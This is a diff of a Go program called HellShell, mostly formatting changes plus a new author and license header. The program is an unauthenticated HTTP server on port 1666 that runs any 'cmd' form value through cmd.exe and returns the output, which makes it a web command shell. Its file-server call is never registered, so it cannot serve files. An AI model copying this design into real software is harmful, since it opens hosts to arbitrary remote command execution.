@@ -1,4 +1,5 @@
-//
+//@(#)Author: Andre Wingor http://andr.ru
+//@(#)License: Devil's Contract
 /*
 HellShell is http server for run shell and file transfer
 Run hells and open at browser port 1666 http://localhost:1666
@@ -12,47 +13,50 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"net/http"
 	"os/exec"
-	"io"
 
-	//"github.com/andrewingor/hellShell/go"
+	"github.com/andrewingor/hellShell/go"
 )
 
-const revision = "$Id$" // Revision ID
+const Revision = "$Id$" // Revision ID
 var (
-	echo []byte//Output of command
-	err error		//Error
+	echo []byte //Output of command
+	err  error  //Error
 )
+
 //
-func init () {
-//
+func init() {
+	//
 }
+
 // Conclusion of Contract
-func conclusion (
-		resp http.ResponseWriter,
-		req *http.Request	) {
+func conclusion(
+	resp http.ResponseWriter,
+	req *http.Request) {
 
-	io.WriteString(resp, webmuzzle )
+	io.WriteString(resp, webmuzzle)
 
-    echo, err = exec.Command( "cmd", "/C", req.FormValue("cmd") ).Output()
-	if err != nil { 
-		fmt.Println (err)
-		io.WriteString(resp, err.Error() )
+	echo, err = exec.Command("cmd", "/C", req.FormValue("cmd")).Output()
+	if err != nil {
+		fmt.Println(err)
+		io.WriteString(resp, err.Error())
 	}
-	io.WriteString(resp, string(echo) ) 
+	io.WriteString(resp, string(echo))
 
-	io.WriteString(resp, "<hr>" + req.FormValue("cmd"))
+	io.WriteString(resp, "<hr>"+req.FormValue("cmd"))
 	io.WriteString(resp, "</body></html>")
 }
+
 //Hell Shell Run and Contracts conclusion
 func main() {
 	workdir := "."
 
-	http.HandleFunc ("/", conclusion )
-	http.ListenAndServe(":1666", nil )
+	http.HandleFunc("/", conclusion)
+	http.ListenAndServe(":1666", nil)
 
-	http.FileServer(http.Dir (workdir))
+	http.FileServer(http.Dir(workdir))
 }
 
 //Web-muzzle
@@ -93,4 +97,5 @@ cmd.exe&gt;<input class="cmd" type="text" name="cmd" value="" autofocus />
 <script type="text/javascript">document.cmdstr.cmd.focus();</script>
 <hr/>
 `
+
 //EOF
